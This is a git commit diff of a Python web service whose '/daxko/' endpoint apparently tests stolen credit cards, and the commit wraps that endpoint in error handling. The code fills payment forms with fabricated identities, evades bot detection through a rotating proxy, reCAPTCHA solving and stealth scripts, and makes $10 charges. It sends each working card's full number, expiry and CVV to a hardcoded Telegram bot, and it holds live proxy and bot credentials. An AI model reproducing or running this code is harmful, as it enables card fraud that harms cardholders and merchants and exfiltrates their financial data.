6c5e0b66fdde74db0af9b3cad024b714e9b4a2e3
gello mendez <128371781+cherry0021@users.noreply.github.com>
2023-04-11 13:28:25 +0800

    Update main.py

--- main.py
+++ main.py
@@ -143,160 +143,164 @@ async def root():
     
 @app.route('/daxko/', methods=['POST'])
 async def daxko1_api(card):
-    data = request.get_json() 
-    cc = data['card']
-                    
-    ccdata = cc.split('|')
-    ccn = ccdata[0]
-    mm = ccdata[1]
-    yy = ccdata[2]
-    yy1 = yy[2:]
-    cvv = ccdata[3]
-    user = RandomUser({'nat': 'ca'})
-    fullname = user.get_full_name()
-    fname = user.get_first_name()
-    lname = user.get_last_name()
-    email = user.get_email()
-    street = user.get_street()
-    phone = user.get_phone()
-    city = user.get_city()
-    if ccn[:1] == "4":
-        card_type = "visa"
-    elif ccn[:1] == "5":
-        card_type = "mastercard"
-    elif ccn[:1] == "3":
-        card_type = "amex"
-    else:
-        card_type = "discover"
     
-    configs = {
-        'CHROME_BUNDLE': "chromedriver",
-        'HEADLESS': 'true'
-        }
-    
-    headless = True if configs["HEADLESS"] == "true" else False    
-    args = [
-        '--deny-permission-prompts',
-        '--no-default-browser-check',
-        '--no-first-run',
-        '--deny-permission-prompts',
-        '--disable-popup-blocking',
-        '--ignore-certificate-errors',
-        '--no-service-autorun',
-        '--password-store=basic',
-        f'--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
-        '--window-size=640,480',
-        '--disable-audio-output'
-    ]       
-    url = random_url()
-    host = "rotating-residential.geonode.com:9010"
-    user = "geonode_KpJmpEv7Bg"
-    password = "490e6d9c-ccfe-4ee8-b282-2e56e796eac6"
-    proxy = {"http": host, "https": host}
-    proxies = {"server": host,
-               "username": user,
-               "password": password}
-    scraper = cloudscraper.create_scraper()
-    content =  scraper.get(url)
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=headless, args=args)
-        # context = await browser.new_context()
-        page = await browser.new_page()
+    try:
+        data = request.get_json() 
+        cc = data['card']
 
-        
-        # async def set_proxy_for_request(route, request):
-        #     page.on("request", lambda request: print(">>", request.method, request.url))
-        #     urls = request.url
-        #     req = request.post_data
-        #     if 'payment_info_s' in req.json(): # assuming response is in JSON format
-        #         payment_info = req.json()['payment_info_s']
-        #         if 'credit_card' in payment_info:
-        #             del payment_info['credit_card']['cvv']
-        #             await  route.fulfill(url=request.url, body=request.body, headers=request.headers)
-        #         print("success")
-        #     else:
-        #         await route.continue_()    
-        #         print("good")    
-       
-        page.set_default_navigation_timeout(60000)
-        await page.goto(f"data:text/html,{content.text}")
-        await page.wait_for_timeout(10000)
-        await page.goto(content.url)
-        await page.wait_for_load_state(timeout=15000)
-        await page.wait_for_timeout(10000)
-#         page.proxy = rotate_masked()
-        async with recaptchav2.AsyncSolver(page) as solver:
-            await stealth_async(page)
-            token = await solver.solve_recaptcha()
-            print(token)  
-        await page.get_by_role("button", name="Other").click()
-        
-        await page.get_by_role("button", name="$").locator("input[type=\"text\"]").fill("10")
-        await page.get_by_role("heading", name="Your information").click()
-        await page.get_by_label("Email Address").click()
-        await page.get_by_label("Email Address").fill(email)
-        await page.get_by_label("Email Address").press("Tab")
-        await page.get_by_role("textbox", name="Name First Name").fill(fname)
-        await page.get_by_role("textbox", name="Name First Name").press("Tab")
-        await page.get_by_label("Last Name").fill(lname)
-        await page.get_by_label("Last Name").press("Tab")
-        await page.get_by_placeholder("205-555-5555").fill(phone)
-        await page.get_by_placeholder("205-555-5555").press("Tab")
-        await page.get_by_label("Zip Code").fill("90001")
-        await page.get_by_label("Zip Code").press("Tab")
-        await page.get_by_role("combobox", name="Payment Method *").select_option("credit_card")
-        billing = await page.content()
-        if "Billing Address" in billing:
-            await page.get_by_label("Billing Address *").fill("d")
-            await page.get_by_label("Billing Address *").click()
-            await page.get_by_label("Billing Address *").fill(street)
-            await page.get_by_label("Billing Zip *").click()
-            await page.get_by_label("Billing Zip *").fill("90001")
-            await page.get_by_label("Billing Zip *").press("Tab")
-        await page.get_by_label("Name on Card *").click()
-        await page.get_by_label("Name on Card *").fill(fullname)
-        await page.locator("select[name=\"credit_card\\.card_type\"]").select_option(card_type)
-        await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").click()
-        await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").fill(ccn)
-        await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").press("Tab")
-        await page.get_by_role("combobox", name="Expiration *").press("Tab")
-        await page.locator("#expiration-month").select_option(value=mm)
-        await page.locator("#expiration-year").select_option(value=yy)
-        if "Security Code" in billing:
-            await page.get_by_label("Security Code *").fill(cvv)
-        await page.wait_for_load_state(timeout=20000)
-        
-        
-        async with page.expect_response("**/make_payment") as respo:
-            # page.proxy = None
-            # await page.route(f"{url}/make_payment", set_proxy_for_request)
-            await page.locator("#pay-button").click()
-            res = await respo.value
-            response = await res.body()
-            print(response)
-            # check_recaptcha_solved(page)
-         
-            
-            
-            
-            
-        # Bank_Message = find_between(str(response), 'name="Bank_Message" id="Bank_Message" value="', '"')
-        # Bank_Resp_Code = find_between(str(response), 'name="Bank_Resp_Code" id="Bank_Resp_Code" value="', '"')
-        # AVS = find_between(str(response), 'name="AVS" id="AVS" value="', '"')
-        # _IP = find_between(str(response), 'name="Client_IP" id="Client_IP" value="', '"')
-        # print(_IP)
-        data = find_between(str(response), "{", "}")
-        
-        
-        result =  str({data})
-        result = result
-        if 'CVV2/VAK Failure' in result or 'CVV2 Missmatch' in result or '"success":true' in result:
-            requests.get(
-                'https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
-        
-            # respo = await get_response(navigate)
-        await browser.close()
-        await page.close()
-        return result
+        ccdata = cc.split('|')
+        ccn = ccdata[0]
+        mm = ccdata[1]
+        yy = ccdata[2]
+        yy1 = yy[2:]
+        cvv = ccdata[3]
+        user = RandomUser({'nat': 'ca'})
+        fullname = user.get_full_name()
+        fname = user.get_first_name()
+        lname = user.get_last_name()
+        email = user.get_email()
+        street = user.get_street()
+        phone = user.get_phone()
+        city = user.get_city()
+        if ccn[:1] == "4":
+            card_type = "visa"
+        elif ccn[:1] == "5":
+            card_type = "mastercard"
+        elif ccn[:1] == "3":
+            card_type = "amex"
+        else:
+            card_type = "discover"
+
+        configs = {
+            'CHROME_BUNDLE': "chromedriver",
+            'HEADLESS': 'true'
+            }
+
+        headless = True if configs["HEADLESS"] == "true" else False    
+        args = [
+            '--deny-permission-prompts',
+            '--no-default-browser-check',
+            '--no-first-run',
+            '--deny-permission-prompts',
+            '--disable-popup-blocking',
+            '--ignore-certificate-errors',
+            '--no-service-autorun',
+            '--password-store=basic',
+            f'--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+            '--window-size=640,480',
+            '--disable-audio-output'
+        ]       
+        url = random_url()
+        host = "rotating-residential.geonode.com:9010"
+        user = "geonode_KpJmpEv7Bg"
+        password = "490e6d9c-ccfe-4ee8-b282-2e56e796eac6"
+        proxy = {"http": host, "https": host}
+        proxies = {"server": host,
+                   "username": user,
+                   "password": password}
+        scraper = cloudscraper.create_scraper()
+        content =  scraper.get(url)
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=headless, args=args)
+            # context = await browser.new_context()
+            page = await browser.new_page()
+
+
+            # async def set_proxy_for_request(route, request):
+            #     page.on("request", lambda request: print(">>", request.method, request.url))
+            #     urls = request.url
+            #     req = request.post_data
+            #     if 'payment_info_s' in req.json(): # assuming response is in JSON format
+            #         payment_info = req.json()['payment_info_s']
+            #         if 'credit_card' in payment_info:
+            #             del payment_info['credit_card']['cvv']
+            #             await  route.fulfill(url=request.url, body=request.body, headers=request.headers)
+            #         print("success")
+            #     else:
+            #         await route.continue_()    
+            #         print("good")    
+
+            page.set_default_navigation_timeout(60000)
+            await page.goto(f"data:text/html,{content.text}")
+            await page.wait_for_timeout(10000)
+            await page.goto(content.url)
+            await page.wait_for_load_state(timeout=15000)
+            await page.wait_for_timeout(10000)
+    #         page.proxy = rotate_masked()
+            async with recaptchav2.AsyncSolver(page) as solver:
+                await stealth_async(page)
+                token = await solver.solve_recaptcha()
+                print(token)  
+            await page.get_by_role("button", name="Other").click()
+
+            await page.get_by_role("button", name="$").locator("input[type=\"text\"]").fill("10")
+            await page.get_by_role("heading", name="Your information").click()
+            await page.get_by_label("Email Address").click()
+            await page.get_by_label("Email Address").fill(email)
+            await page.get_by_label("Email Address").press("Tab")
+            await page.get_by_role("textbox", name="Name First Name").fill(fname)
+            await page.get_by_role("textbox", name="Name First Name").press("Tab")
+            await page.get_by_label("Last Name").fill(lname)
+            await page.get_by_label("Last Name").press("Tab")
+            await page.get_by_placeholder("205-555-5555").fill(phone)
+            await page.get_by_placeholder("205-555-5555").press("Tab")
+            await page.get_by_label("Zip Code").fill("90001")
+            await page.get_by_label("Zip Code").press("Tab")
+            await page.get_by_role("combobox", name="Payment Method *").select_option("credit_card")
+            billing = await page.content()
+            if "Billing Address" in billing:
+                await page.get_by_label("Billing Address *").fill("d")
+                await page.get_by_label("Billing Address *").click()
+                await page.get_by_label("Billing Address *").fill(street)
+                await page.get_by_label("Billing Zip *").click()
+                await page.get_by_label("Billing Zip *").fill("90001")
+                await page.get_by_label("Billing Zip *").press("Tab")
+            await page.get_by_label("Name on Card *").click()
+            await page.get_by_label("Name on Card *").fill(fullname)
+            await page.locator("select[name=\"credit_card\\.card_type\"]").select_option(card_type)
+            await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").click()
+            await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").fill(ccn)
+            await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").press("Tab")
+            await page.get_by_role("combobox", name="Expiration *").press("Tab")
+            await page.locator("#expiration-month").select_option(value=mm)
+            await page.locator("#expiration-year").select_option(value=yy)
+            if "Security Code" in billing:
+                await page.get_by_label("Security Code *").fill(cvv)
+            await page.wait_for_load_state(timeout=20000)
+
+
+            async with page.expect_response("**/make_payment") as respo:
+                # page.proxy = None
+                # await page.route(f"{url}/make_payment", set_proxy_for_request)
+                await page.locator("#pay-button").click()
+                res = await respo.value
+                response = await res.body()
+                print(response)
+                # check_recaptcha_solved(page)
+
+
+
+
+
+            # Bank_Message = find_between(str(response), 'name="Bank_Message" id="Bank_Message" value="', '"')
+            # Bank_Resp_Code = find_between(str(response), 'name="Bank_Resp_Code" id="Bank_Resp_Code" value="', '"')
+            # AVS = find_between(str(response), 'name="AVS" id="AVS" value="', '"')
+            # _IP = find_between(str(response), 'name="Client_IP" id="Client_IP" value="', '"')
+            # print(_IP)
+            data = find_between(str(response), "{", "}")
+
+
+            result =  str({data})
+            result = result
+            if 'CVV2/VAK Failure' in result or 'CVV2 Missmatch' in result or '"success":true' in result:
+                requests.get(
+                    'https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
+
+                # respo = await get_response(navigate)
+            await browser.close()
+            await page.close()
+            return result
+    except Exception as err:
+        return f"error message: {err}"
 
 
